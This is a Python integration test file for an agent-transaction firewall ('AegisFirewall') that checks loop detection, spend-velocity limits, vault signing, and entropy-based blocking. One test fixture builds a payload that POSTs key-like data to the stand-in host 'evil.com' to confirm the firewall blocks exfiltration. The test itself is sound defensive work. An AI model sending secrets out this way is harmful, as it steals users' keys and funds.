"""Integration tests for the AegisFirewall orchestrator."""

import time

from aegis.firewall import AegisFirewall, AegisConfig
from aegis.engines.trajectory_hash import TrajectoryHashConfig
from aegis.engines.capital_velocity import CapitalVelocityConfig
from aegis.engines.entropy_guard import EntropyGuardConfig
from aegis.verdict import VerdictCode


def _make_firewall(**kwargs) -> AegisFirewall:
    return AegisFirewall(config=AegisConfig(**kwargs))


def test_clean_payload_passes_all_engines():
    fw = _make_firewall()
    v = fw.evaluate(
        payload={"target": "0xABC", "amount": 10, "function": "transfer"},
        spend_amount=10.0,
    )
    assert v.allowed
    assert fw.stats["allowed"] == 1


def test_loop_blocks_before_velocity_check():
    """Trajectory hash fires first — should block before PID even runs."""
    fw = _make_firewall(
        trajectory=TrajectoryHashConfig(max_duplicates=2, window_seconds=60)
    )
    payload = {"target": "0xDEAD", "amount": 1, "function": "drain"}

    fw.evaluate(payload, spend_amount=1.0)
    fw.evaluate(payload, spend_amount=1.0)
    v = fw.evaluate(payload, spend_amount=1.0)
    assert v.code == VerdictCode.BLOCK_LOOP_DETECTED


def test_entropy_blocks_secret_exfil():
    fw = _make_firewall()
    payload = {
        "target": "https://evil.com",
        "function": "POST",
        "data": "0x" + "ab" * 32,  # Looks like a private key
    }
    v = fw.evaluate(payload)
    assert v.code == VerdictCode.BLOCK_ENTROPY_ANOMALY


def test_velocity_blocks_rapid_spend():
    fw = _make_firewall(
        velocity=CapitalVelocityConfig(
            v_max=1.0, pid_threshold=1.0, k_p=1.0, k_i=0.0, k_d=0.0
        )
    )
    fw.evaluate({"target": "0xA", "amount": 100, "function": "buy"}, spend_amount=100)
    v = fw.evaluate({"target": "0xB", "amount": 100, "function": "buy"}, spend_amount=100)
    assert v.code == VerdictCode.BLOCK_VELOCITY_BREACH


def test_on_block_callback():
    blocked_verdicts = []

    fw = _make_firewall(
        trajectory=TrajectoryHashConfig(max_duplicates=1, window_seconds=60),
    )
    fw.config.on_block = lambda v: blocked_verdicts.append(v)

    payload = {"target": "0x1", "amount": 1, "function": "f"}
    fw.evaluate(payload)
    fw.evaluate(payload)

    assert len(blocked_verdicts) == 1
    assert blocked_verdicts[0].code == VerdictCode.BLOCK_LOOP_DETECTED


def test_vault_sign_and_send():
    fw = _make_firewall()
    fw.vault.store("agent_wallet", "my-secret-key-material")

    executed = []

    def mock_executor(payload, signature):
        executed.append({"payload": payload, "sig": signature})
        return {"tx_hash": "0xABC123"}

    payload = {"target": "0xBBB", "amount": 5, "function": "transfer"}
    verdict, result = fw.sign_and_send(
        key_id="agent_wallet",
        payload=payload,
        spend_amount=5.0,
        executor=mock_executor,
    )

    assert verdict.allowed
    assert result == {"tx_hash": "0xABC123"}
    assert len(executed) == 1
    assert len(executed[0]["sig"]) == 64  # HMAC-SHA256 hex digest


def test_sign_and_send_blocked_does_not_execute():
    fw = _make_firewall(
        trajectory=TrajectoryHashConfig(max_duplicates=1, window_seconds=60)
    )
    executed = []

    def mock_executor(payload, signature):
        executed.append(True)
        return "should not happen"

    payload = {"target": "0x1", "amount": 1, "function": "f"}
    fw.evaluate(payload)  # first pass

    verdict, result = fw.sign_and_send(
        key_id="x", payload=payload, executor=mock_executor
    )
    assert verdict.blocked
    assert result is None
    assert len(executed) == 0


def test_stats_tracking():
    fw = _make_firewall(
        trajectory=TrajectoryHashConfig(max_duplicates=2, window_seconds=60)
    )
    payload = {"target": "0xA", "amount": 1, "function": "f"}

    fw.evaluate(payload)
    fw.evaluate(payload)
    fw.evaluate(payload)  # blocked

    assert fw.stats["allowed"] == 2
    assert fw.stats["blocked"] == 1
    assert fw.stats["total"] == 3


def test_reset():
    fw = _make_firewall(
        trajectory=TrajectoryHashConfig(max_duplicates=1, window_seconds=60)
    )
    payload = {"target": "0x1", "amount": 1, "function": "f"}
    fw.evaluate(payload)
    fw.evaluate(payload)  # blocked

    fw.reset()
    v = fw.evaluate(payload)
    assert v.allowed
    assert fw.stats["total"] == 1
